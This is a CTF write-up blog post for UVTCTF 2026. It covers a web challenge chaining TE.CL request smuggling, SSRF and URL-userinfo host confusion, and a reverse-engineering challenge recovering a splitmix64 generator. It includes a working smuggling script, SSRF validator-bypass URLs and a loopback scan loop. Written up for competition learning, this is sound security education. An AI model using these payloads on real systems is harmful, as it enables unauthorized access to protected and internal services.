---
title: "UVTCTF 2026 — CTF Write-Up"
date: 2026-03-01 12:00:00 +0200
tags: [CTF, UVTCTF2026]
categories: [CTF, Writeups]
---

## Overview

This post covers the two most interesting challenges I solved during **UVTCTF 2026**.

---

## 1. Sea-Side Contraband — Web

**Category:** Web · **Vulnerability:** HTTP Request Smuggling (TE.CL) → SSRF → URL Userinfo Host Confusion → Directory Walk

### Summary

A fictional corporate espionage scenario from "Cosmic Components Co." hid a set of credentials and a secret internal website. The goal was to chain multiple vulnerabilities to reach a hidden internal network service and retrieve the flag.

**Full vulnerability chain:**
1. HTTP Request Smuggling (TE.CL) → bypass `/admin` 403 and obtain `relay_auth` cookie
2. SSRF via `/admin/relay` → reach internal network
3. URL userinfo host confusion → pivot to undisclosed loopback IP
4. Directory walking on hidden internal service → retrieve flag

### 1.1 — Initial Recon

The document provided:
- App URL: `http://194.102.62.166:26562/`
- Credentials: `AlexGoodwin` / `Pine123`
- Description of an internal portal with "maps, dispatches, registries"
- Hint about a hidden internal network: *"inventory nodes, relay checks, and stock queries that do not behave like normal public resources"*

After logging in, the app revealed several pages:
- `/` — Home (Operations Control Deck)
- `/forum` — Forum with post/edit/search
- `/gateway-log` — Edge gateway change log
- `/registry` — Freight registry table
- `/admin` — **403 Forbidden**

The clearance badge showed `CLEARANCE: FREIGHT OPS`, indicating a role hierarchy. The `/admin` nav link existed but was blocked.

### 1.2 — Recon of the Admin Page

Despite the 403, the stylesheet at `/static/style.css` leaked the full structure of the admin page through CSS class names:

```css
.admin-probe-form { ... }
.admin-probe-actions { ... }
.admin-probe-result { ... }
.admin-key-box { ... }
.admin-ledger-table { ... }
```

This revealed that `/admin` contained:
- A **customs ledger table**
- A **probe console** (form with a URL input, posting to `/admin/relay`)
- A **probe result** display area

This strongly implied an **SSRF sink** at `/admin/relay`.

### 1.3 — Bypassing /admin — Attempted Techniques

Many standard bypass approaches were tried and failed:

| Technique | Result |
|---|---|
| Path variants (`/admin/`, `/ADMIN`, `/%61dmin`, `/admin/.`) | 403 |
| HTTP headers (`X-Forwarded-For: 127.0.0.1`, `X-Real-IP`, `X-Original-URL`) | 403 |
| HTTP methods (PUT, POST, OPTIONS, HEAD) | 403 |
| Query params (`?role=admin`, `?mark=true`, `?bypass=1`) | 403 |
| Host header manipulation | 403 |
| SQLi in login form | Failed (parameterized) |
| SQLi in forum search | Failed (parameterized) |
| SSTI in forum posts (`{%raw%}{{7*7}}{%endraw%}`, `${7*7}`) | Not evaluated |
| IDOR on forum edit (other post IDs) | Server checks ownership |
| XSS on /forum endpoint | No bot/admin check  |

The 403 response had `Connection: close` while all 200 responses had `Connection: keep-alive` — a sign of **different handling layers** (proxy vs. backend).

### 1.4 — The Key Hint — Gateway Change Log

The `/gateway-log` page contained four entries that were thematic but literal hints:

| Date | Component | Change | Op Note |
|---|---|---|---|
| 2026-02-07 | edge-gw-02 | "Applied transfer metadata normalization for inter-sector traffic." | "Keep **tunnel persistence** enabled for telemetry handoffs." |
| 2026-02-09 | route-scheduler | "**Dual manifest** compatibility mode enabled for legacy cargo partners." | "**Public manifest** remains primary record for external auditors." |
| 2026-02-12 | edge-gw-02 | "**Length declarations preserved** to avoid breaking old depot nodes." | — |
| 2026-02-13 | telemetry-sync | "**Connection reuse** window expanded for backhaul efficiency." | "Do not **split maintenance sequences** across separate channels." |

Decoded:
- **"Dual manifest"** = both `Content-Length` and `Transfer-Encoding` headers present
- **"Length declarations preserved"** = the proxy passes `Content-Length` through unchanged
- **"Public manifest is primary"** = `Content-Length` is what the frontend reads
- **"Tunnel persistence" + "connection reuse"** = persistent (keep-alive) connections to backend
- **"Do not split"** = don't break the smuggled request across packets

This is a textbook description of **HTTP Request Smuggling (TE.CL)**:
- **Frontend proxy** reads `Transfer-Encoding: chunked`
- **Backend app** reads `Content-Length`

### 1.5 — The Poison Request

```
POST / HTTP/1.1
Host: 194.102.62.166:26562
Cookie: session=<valid_session>
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Connection: keep-alive

65
GET /admin HTTP/1.1
Host: 194.102.62.166:26562
Cookie: session=<valid_session>

0

```

- `Content-Length: 4` → backend reads `65\r\n` (4 bytes = the hex chunk size line) and stops
- Frontend proxy reads the full chunked body (101-byte chunk containing `GET /admin...` + terminating `0` chunk)
- The `GET /admin HTTP/1.1...` bytes remain in the backend buffer

### The Follow-up Request

Sent immediately after the poison on the same TCP connection:

```
GET / HTTP/1.1
Host: 194.102.62.166:26562
Cookie: session=<valid_session>
Connection: close
```

The backend prepends the buffered `GET /admin...` to this incoming request and processes it. Since the request reaches the **backend directly** (not through the proxy's role-check), `/admin` is served without the 403.

### Implementation (Python raw socket)

```python
import socket, time, requests, re

host = "194.102.62.166"
port = 26562

s = requests.Session()
s.post(f'http://{host}:{port}/login', data={'username':'AlexGoodwin','password':'Pine123'})
session = s.cookies.get('session')

smuggled = (
    f"GET /admin HTTP/1.1\r\n"
    f"Host: {host}:{port}\r\n"
    f"Cookie: session={session}\r\n"
    f"\r\n"
)
chunk_size = hex(len(smuggled))[2:]   # e.g. "65"
cl = len(chunk_size + "\r\n")        # Content-Length = 4 (just the size line)
body = f"{chunk_size}\r\n{smuggled}\r\n0\r\n\r\n"

poison = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {host}:{port}\r\n"
    f"Cookie: session={session}\r\n"
    f"Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {cl}\r\n"
    f"Transfer-Encoding: chunked\r\n"
    f"Connection: keep-alive\r\n"
    f"\r\n"
    f"{body}"
).encode()

followup = (
    f"GET / HTTP/1.1\r\n"
    f"Host: {host}:{port}\r\n"
    f"Cookie: session={session}\r\n"
    f"Connection: close\r\n"
    f"\r\n"
).encode()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(15)
sock.connect((host, port))
sock.sendall(poison)
time.sleep(0.5)
sock.sendall(followup)
time.sleep(5)

response = b""
try:
    while True:
        chunk = sock.recv(4096)
        if not chunk: break
        response += chunk
except: pass
sock.close()
```

### The Response

The socket received **two** HTTP responses back-to-back:

1. **Response 1** (200) — home page for the `POST /` follow-up request
2. **Response 2** (200) — **the admin page**, with a critical cookie:

```
Set-Cookie: relay_auth=b2436129912e81840ad2a5253b7f73aeae1a546f1f76f0d4w000fw00f; Path=/admin; HttpOnly; SameSite=Lax
```

With this `relay_auth` cookie, `/admin` and all `/admin/*` routes are now directly accessible.

![Admin page accessed via smuggling](/assets/img/posts/uvtctf2026/admin-page.png)
_Admin page after obtaining the relay_auth cookie_

![Admin probe console](/assets/img/posts/uvtctf2026/admin-probe.png)
_The Harbor Inventory Probe Console_

> **Note:** For the first box I used `//admin/admin` and it gave me the credentials, so you can omit the smuggling part.

### 1.6 — Admin Page — The SSRF Probe

The admin page contained the **Harbor Inventory Probe Console**:

```html
<form method="post" action="/admin/relay" class="admin-probe-form">
  <select name="inventory_node" required>
    <option value="http://127.0.0.21:9100/inventory/stock/check?HarborId=1">West Hub Adapter</option>
    <option value="http://127.0.0.21:9100/inventory/stock/check?HarborId=2">Atlantic Hub Adapter</option>
    <option value="http://127.0.0.21:9100/inventory/stock/check?HarborId=3">Mediterranean Hub Adapter</option>
    <option value="http://127.0.0.21:9100/inventory/stock/check?HarborId=4">Cape Hub Adapter</option>
  </select>
</form>
```

`POST /admin/relay` with `inventory_node=<url>` fetches the URL server-side and returns the result in a `<pre>` block — a classic **SSRF sink**.

Known internal service: `http://127.0.0.21:9100` (inventory adapter)

Querying it directly worked:

```
POST /admin/relay
inventory_node=http://127.0.0.21:9100/inventory/stock/check?HarborId=1

→ {"node":"127.0.0.21:9100","service":"inventory-adapter","harbor_id":"1",...}
```

But the known service only had `/inventory/stock/check` endpoints. The flag was not there.

![SSRF probe result](/assets/img/posts/uvtctf2026/ssrf-probe.png)
_Querying the inventory adapter via the SSRF probe_
### 1.7 — SSRF Validation Bypass — URL Userinfo Host Confusion

Attempting arbitrary URLs revealed the validator's rules:
- Port must be **9100**
- IP must be in `127.0.0.x` range
- Non-dotted hostnames (e.g. `localhost`) rejected

To pivot to other loopback IPs while satisfying the validator, the **URL userinfo trick** was used:

```
http://127.0.0.21:9100@127.0.0.X:9100/path
```

**Why it works:**
- The validator sees `127.0.0.21:9100` (before the `@`) and considers it valid
- The HTTP client treats the part before `@` as credentials (userinfo) and connects to the **actual host** after `@`: `127.0.0.X:9100`

This is a classic **parser differential**: the validator and the HTTP client disagree on what the "host" is.

![URL userinfo bypass](/assets/img/posts/uvtctf2026/userinfo-bypass.png)
_Parser differential between the validator and the HTTP client_
### 1.8 — Loopback Range Scan

Using the userinfo bypass, all 254 loopback addresses were scanned on port 9100:

```python
for i in range(1, 255):
    ip = f"127.0.0.{i}"
    if ip == "127.0.0.21": continue  # known
    url = f"http://127.0.0.21:9100@{ip}:9100/"
    result = probe(url)
    if result != "REFUSED":
        print(f"[FOUND] {ip}:9100 -> {result}")
```

**Result:** Hidden service found at `127.0.0.241:9100`

```
node://127.0.0.241:9100/
mode=listing

ops
manifests
drops
logs
notes.txt
```

![Hidden service found](/assets/img/posts/uvtctf2026/hidden-service.png)
_Directory listing from the hidden internal service_

> **Note:** The instance-specific IP differs per deployment. The write-up referenced `127.0.0.230` but this instance used `127.0.0.241`. Always scan.

### 1.9 — Directory Walking the Hidden Service

The hidden service at `127.0.0.241:9100` returned directory listings. Walking the tree:

```
/                          → ops, manifests, drops, logs, notes.txt
/ops                       → ops/directives.txt, ops/ports, ops/finance
/ops/directives.txt        → "Keep private manifests outside public audit channels..."
/manifests                 → manifests/public, manifests/private
/manifests/private         → 44c, 52a, 71d
/manifests/private/44c     → readme.txt, split.log
/manifests/private/44c/readme.txt  → "Batch 44-C split mode active. See /drops/pacific/batch-44c."
/drops                     → drops/atlantic, drops/pacific, drops/cape
/drops/pacific             → drops/pacific/batch-44c
/drops/pacific/batch-44c   → route-map.txt, vault
/drops/pacific/batch-44c/vault         → sealed, audit
/drops/pacific/batch-44c/vault/sealed  → manifest.bin, channel.key, flag  ← 🎯
```

![Directory tree](/assets/img/posts/uvtctf2026/directory-tree.png)
_Walking the hidden service directory structure_

### 1.10 — Flag Retrieval

Final request:

```bash
curl -sS 'http://194.102.62.166:26562/admin/relay' \
  -H 'Cookie: relay_auth=b2436129912e81840ad2a5253b7f73aeae1a546f1f76f0d4w000fw00f; session=<session>' \
  --data-urlencode 'inventory_node=http://127.0.0.21:9100@127.0.0.241:9100/drops/pacific/batch-44c/vault/sealed/flag'
```

Response:

```
Status: 200

UVT{N0w_Y0u_R34lLy_Pr0v3d_y0ur53lf_MrP1n3}
```

![Flag retrieved](/assets/img/posts/uvtctf2026/sea-side-flag.png)
_Flag obtained from the sealed vault_
### Vulnerability Chain Summary

```
[403 /admin]
    └── HTTP Request Smuggling (TE.CL)
        └── Backend processes smuggled GET /admin bypassing proxy auth
            └── relay_auth cookie issued
                └── [Access to /admin/relay SSRF endpoint]
                    └── URL userinfo host confusion (validator bypass)
                        └── Loopback scan 127.0.0.1-254 → finds 127.0.0.241
                            └── Directory walk on hidden internal service
                                └── /drops/pacific/batch-44c/vault/sealed/flag
                                    └── FLAG: UVT{N0w_Y0u_R34lLy_Pr0v3d_y0ur53lf_MrP1n3}
```

---

## 2. satellua — Reverse Engineering

**Category:** Pwn / RE · **Vulnerability:** Custom Bytecode Format + Splitmix64 State Recovery

### Summary

The binary embeds a custom Lua-like bytecode format using the signature `\x1bSatellua`. It presents as a large interpreter with a massive constant pool, custom bytecode parsing, and lots of misleading runtime noise — but hides a `Flag: %s` print path deep inside.

The main obstacle: the visible flag buffer only updates once every `0x111088` samples, making dynamic observation impractical.

**Solution chain:**
1. Reverse the custom `Satellua` chunk format
2. Find the hidden flag sampler in native code
3. Identify which runtime value is being sampled
4. Recover the 64-bit generator behind that value
5. Compute the milestone outputs offline and decode the flag

### 2.1 — Finding the Hidden Sampler

The key function is `FUN_00405800` at `0x405800`. The hidden flag logic only triggers when `param_2 == 2` and the top Lua stack value has tag `0x03` (integer).

When triggered, it reads the 64-bit integer from the stack, increments an internal counter, and every `0x111088` calls it xors all 8 bytes of the integer into a single byte, xors that with a key byte from `DAT_004227e0`, appends the result to a local buffer, and prints `Iteration %d Collapsed: %02x` followed by `Flag: %s`.

The problem is not triggering the print — it's reconstructing the sampled integer stream.

![Ghidra decompilation of hidden sampler](/assets/img/posts/uvtctf2026/hidden-sampler.png)
_Ghidra decompilation of the hidden flag sampler at FUN\_00405800_
### 2.2 — Parsing the Embedded Satellua Chunk

The embedded bytecode chunk lives at file offset `0x302e0`. A custom parser (`parse_satellua.py`) was written to mirror the custom loader:

- Signature: `\x1bSatellua`, version `0x55`, format `0x01`
- Varints: big-endian base-128, integers: zigzag-decoded
- Strings: cached with backreferences

The parser revealed three prototypes: a small root, `child1` (the main body — 1,270,825 instructions, 323,450 constants), and `child2` (a tiny helper with 6 instructions). The 323,434 integer constants in `child1` don't match runtime values directly, ruling out the easy read from the constant pool.

![Parsed chunk structure](/assets/img/posts/uvtctf2026/chunk-structure.png)
_Satellua chunk structure showing the three prototypes_
### 2.3 — What Value Gets Sampled?

Tracing calls into the sampler with `gdb` showed every sample flows through `FUN_00404ff0`, which always ends by calling the hidden sampler. The sampled value is the integer passed to the builtin `error()`, confirmed via the builtin registration table in `.rodata` — the function at `0x417510` is `error`.

The bytecode is repeatedly doing:

```lua
error(<integer>)
```

and the challenge silently samples that integer. This reframed the problem: instead of reversing all of the bytecode, the goal became recovering the numeric generator behind `error()`.


### 2.4 — Recovering the State Machine

Dumping the active Lua frame across consecutive samples showed only five registers changing between calls:

| Register | Role |
|---|---|
| `R1` | Previous output |
| `R192` | Previous output (copy) |
| `R193` | Internal 64-bit state |
| `R194` | Current output |
| `R196` | Copy of `R194` passed into `error()` |

Two consecutive snapshots:

**Sample 2:** `R1 = 0x1fff000`, `R193 = 0x9e3779b9814a6c15`, `R194 = 0x5c47200f3dd3a6ce`

**Sample 3:** `R1 = 0x5c47200f3dd3a6ce`, `R193 = 0xfa7e99c8bd1e22e3`, `R194 = 0x29d5ed154b52bfa1`

The key relationship:

```
R193(next) - R193(cur) = R194(cur) - R1(cur)
```

So the state update is:

```
state_next = state + current_output - previous_output (mod 2^64)
```

Testing whether `R194` is a known 64-bit mixing function of `R193` confirmed an exact match with **splitmix64**:

```python
def splitmix64(x):
    x ^= x >> 30
    x *= 0xbf58476d1ce4e5b9
    x &= (1 << 64) - 1
    x ^= x >> 27
    x *= 0x94d049bb133111eb
    x &= (1 << 64) - 1
    x ^= x >> 31
    return x & ((1 << 64) - 1)
```

Full recurrence:

```python
MASK = (1 << 64) - 1
prev  = 0x1fff000
state = 0x9e3779b9814a6c15

while True:
    cur   = splitmix64(state)
    state = (state + cur - prev) & MASK
    prev  = cur
```

The tail of `child1` (inspected via `dump_instructions.py`) confirms the final state being prepared just before the call to `error()`, with `R196` being loaded from `R194` on the last instruction before dispatch.

![State machine recovery](/assets/img/posts/uvtctf2026/state-machine.png)

_Consecutive Lua frame dumps revealing the splitmix64 state machine_

### 2.5 — Decoding the Flag

The sampler records one value every `0x111088` outputs. For each sampled 64-bit value it xors all 8 bytes into a single byte (`collapse`), then xors that byte with a key byte from `DAT_004227e0`:

```
64 0d ae f1 be 1f 6c f5 38 01 f3 e5 07 e0 98 6d
f4 fd 4e 20 00 fd 46 df c4 fa 0d 4d c2 ac 00 00
```

The binary's live flag buffer truncates at 15 visible characters (`UVT{R3turn_8y_T`), but continuing the decode offline with the recovered recurrence yields the full flag.

### 2.6 — Solver

```python
MASK = (1 << 64) - 1
STEP = 0x111088
KEY  = bytes.fromhex(
    "640daef1be1f6cf53801f3e507e0986d"
    "f4fd4e2000fd46dfc4fa0d4dc2ac0000"
)

def splitmix64(x):
    z = x & MASK
    z = ((z ^ (z >> 30)) * 0xbf58476d1ce4e5b9) & MASK
    z = ((z ^ (z >> 27)) * 0x94d049bb133111eb) & MASK
    z ^= z >> 31
    return z & MASK

def collapse(x):
    out = 0
    for _ in range(8):
        out ^= x & 0xff
        x >>= 8
    return out

prev  = 0x1fff000
state = 0x9e3779b9814a6c15

collapsed = []
for i in range(2, STEP * len(KEY) + 1):
    cur   = splitmix64(state)
    state = (state + cur - prev) & MASK
    prev  = cur
    if i % STEP == 0:
        collapsed.append(collapse(cur))

flag = bytes(a ^ b for a, b in zip(collapsed, KEY))
print(flag)
```

![Solver output](/assets/img/posts/uvtctf2026/solver-output.png)
_Offline solver producing the full flag_

The trailing non-ASCII bytes are an artifact of decoding past the null terminator. The actual flag ends at `}`.

### Helper Files

| File | Purpose |
|---|---|
| `parse_satellua.py` | Custom chunk format parser |
| `dump_instructions.py` | Compact view of prototype tail |
| `DumpFunc.java` | Ghidra script for function dumping |
| `preload_ultra.c` | LD\_PRELOAD shim for runtime tracing |
| `solve_flag.py` | Final offline solver |

### Vulnerability Chain Summary

```
[hidden Flag: %s path]
  └── reverse FUN_00405800
        └── identify sampled 64-bit integer
              └── trace sampler caller → value comes from builtin error()
                    └── dump consecutive Lua-frame states
                          └── recover recurrence:
                                state_next = state + cur - prev
                                cur = splitmix64(state)
                                  └── sample every 0x111088 outputs
                                        └── xor-collapse bytes with DAT_004227e0
                                              └── FLAG: UVT{R3turn_8y_Thr0w_Del1v3r3r}
```
